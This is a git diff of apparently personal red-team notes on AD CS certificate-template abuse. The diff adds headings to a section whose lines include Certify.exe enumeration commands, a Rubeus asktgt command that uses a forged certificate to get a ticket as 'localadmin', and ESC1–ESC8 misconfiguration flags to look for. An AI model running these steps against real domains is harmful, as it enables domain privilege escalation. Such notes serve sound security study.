@@ -1426,6 +1426,7 @@ _So, if an attacker can specify an arbitrary SAN when requesting a certificate t
 
 _Domain escalation scenarios can result from various AD CS template misconfigurations that allow unprivileged users to supply an arbitrary SAN in a certificate enrollment._
 
+#### certify.exe
 
 ```Certify.exe find /clientauth``` -  will query LDAP for available templates that we can examine for our desired criteria:
 
@@ -1433,6 +1434,7 @@ _Domain escalation scenarios can result from various AD CS template misconfigura
 
 ```./Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\hi.pfx /password:Password01```
 
+#### ESC1-10
 
 ESC1 is best as it allows arbitrary alt user in the SAN. popular default user or machine/computer template?
 
@@ -1445,6 +1447,8 @@ ESC 7more yummy permissions to achieve this - ManageCA (aka â€œCA Administratorâ
 ESC8 web enrollment ca and spoolsample
 
 
+#### Example flags to look for after running certify
+
 ```ENROLLEE_SUPPLIES_SUBJECT``` (ESC1)
 
 ManageCA means set ```EDITF_ATTRIBUTESUBJECTALTNAME2``` (ESC7)
@@ -1452,7 +1456,7 @@ ManageCA means set ```EDITF_ATTRIBUTESUBJECTALTNAME2``` (ESC7)
 Full Control means set ```CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT``` and remove the ```PEND_ALL_REQUESTS``` issuance requirement (ESC4)
 
 
-Attack flow -
+#### Attack flow
 
 ```./certify.exe find /vulnerable```
 
